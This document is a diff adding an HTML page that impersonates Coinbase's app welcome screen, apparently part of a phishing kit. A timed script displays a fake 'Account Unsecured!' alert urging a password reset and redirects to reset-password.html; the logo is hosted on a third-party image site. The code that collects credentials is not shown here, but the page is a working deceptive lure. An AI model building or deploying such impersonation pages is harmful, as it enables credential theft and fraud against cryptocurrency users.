@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Welcome to Coinbase App</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #000;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      height: 100vh;
+      padding: 40px 20px;
+      overflow: hidden; /* Prevent scroll during loading */
+    }
+
+    /* Hide main content initially */
+    .main-content {
+      display: none;
+    }
+
+    .top-right {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+    }
+
+    .top-right a {
+      color: #4c8ffb;
+      font-weight: 500;
+      text-decoration: none;
+      font-size: 15px;
+    }
+
+    .logo {
+      margin-top: 40px;
+    }
+
+    .logo img {
+      width: 150px;
+      height: 150px;
+      object-fit: contain;
+    }
+
+    .welcome-text {
+      text-align: center;
+      margin-top: 30px;
+      font-size: 26px;
+      font-weight: 600;
+    }
+
+    .button-container {
+      width: 100%;
+      max-width: 350px;
+      margin-top: 30px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 32px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .btn-primary {
+      background-color: #4c8ffb;
+      color: black;
+    }
+
+    .btn-primary:hover {
+      background-color: #367af6;
+    }
+
+    .btn-google {
+      background-color: #2c2c2c;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .btn-google img {
+      width: 18px;
+      height: 18px;
+    }
+
+    .footer-link {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    .footer-link a {
+      color: #4c8ffb;
+      text-decoration: none;
+    }
+
+    .footer-link a:hover {
+      text-decoration: underline;
+    }
+
+    .pagination {
+      display: flex;
+      gap: 6px;
+      margin-top: 20px;
+    }
+
+    .dot {
+      width: 8px;
+      height: 8px;
+      background-color: #666;
+      border-radius: 50%;
+    }
+
+    .dot.active {
+      background-color: white;
+    }
+
+    /* Loading Screen */
+    .loading-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 2000;
+      opacity: 1;
+      transition: opacity 0.5s ease;
+    }
+
+    .loading-screen.hidden {
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #4c8ffb;
+      border-top: 5px solid transparent;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Pop-up Styles */
+    .popup-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 1000;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .popup {
+      background-color: #1a1a1a;
+      border-radius: 12px;
+      padding: 20px;
+      max-width: 350px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+    }
+
+    .popup-title {
+      font-size: 20px;
+      font-weight: 600;
+      color: #ff4d4d;
+      margin-bottom: 10px;
+    }
+
+    .popup-text {
+      font-size: 14px;
+      color: #ccc;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+
+    .popup-btn {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 32px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      background-color: #4c8ffb;
+      color: black;
+      transition: background-color 0.3s;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .popup-btn:hover {
+      background-color: #367af6;
+    }
+
+    .popup-btn.loading .btn-text {
+      visibility: hidden;
+    }
+
+    .popup-btn.loading::after {
+      content: '';
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      border: 3px solid black;
+      border-top: 3px solid transparent;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+  </style>
+</head>
+<body>
+  <!-- Loading Screen -->
+  <div class="loading-screen" id="loading-screen">
+    <div class="spinner"></div>
+  </div>
+
+  <!-- Main Content -->
+  <div class="main-content" id="main-content">
+    <div class="top-right">
+      <a href="login.html">Sign in</a>
+    </div>
+
+    <div class="logo">
+      <img src="https://i.ibb.co/vvxn966F/In-Shot-20250418-173504055.png" alt="Coinbase Logo">
+    </div>
+
+    <div class="welcome-text">Welcome to<br>Coinbase</div>
+
+    <div class="button-container">
+      <button class="btn btn-primary" onclick="window.location.href='security.html'">Create free account</button>
+      <button class="btn btn-google">
+        <img src="https://www.svgrepo.com/show/475656/google-color.svg" alt="Google Icon">
+        Sign up with Google
+      </button>
+      <div class="footer-link">
+        <a href="#">Browse assets</a>
+      </div>
+    </div>
+
+    <div class="pagination">
+      <div class="dot active"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+
+    <!-- Pop-up -->
+    <div class="popup-overlay" id="popup-overlay">
+      <div class="popup">
+        <div class="popup-title">Account Unsecured!</div>
+        <div class="popup-text">
+          Your account needs a password update to ensure its security. Click below to reset your password now.
+        </div>
+        <button class="popup-btn" id="popup-btn">
+          <span class="btn-text">Click Here</span>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Handle loading screen
+    window.onload = function() {
+      const loadingScreen = document.getElementById('loading-screen');
+      const mainContent = document.getElementById('main-content');
+      const popupOverlay = document.getElementById('popup-overlay');
+
+      // Hide loading screen and show main content after 2 seconds
+      setTimeout(() => {
+        loadingScreen.classList.add('hidden');
+        mainContent.style.display = 'flex';
+        mainContent.style.flexDirection = 'column';
+        mainContent.style.alignItems = 'center';
+        mainContent.style.justifyContent = 'space-between';
+        mainContent.style.height = '100vh';
+        mainContent.style.padding = '40px 20px';
+
+        // Show pop-up after 4 seconds
+        setTimeout(() => {
+          popupOverlay.style.display = 'flex';
+        }, 4000);
+      }, 2000);
+    };
+
+    // Handle pop-up button click with loading effect
+    document.getElementById('popup-btn').addEventListener('click', function() {
+      this.classList.add('loading');
+      this.disabled = true; // Disable button to prevent multiple clicks
+      setTimeout(() => {
+        window.location.href = 'reset-password.html';
+      }, 1000); // Redirect after 1 second
+    });
+  </script>
+</body>
+</html>
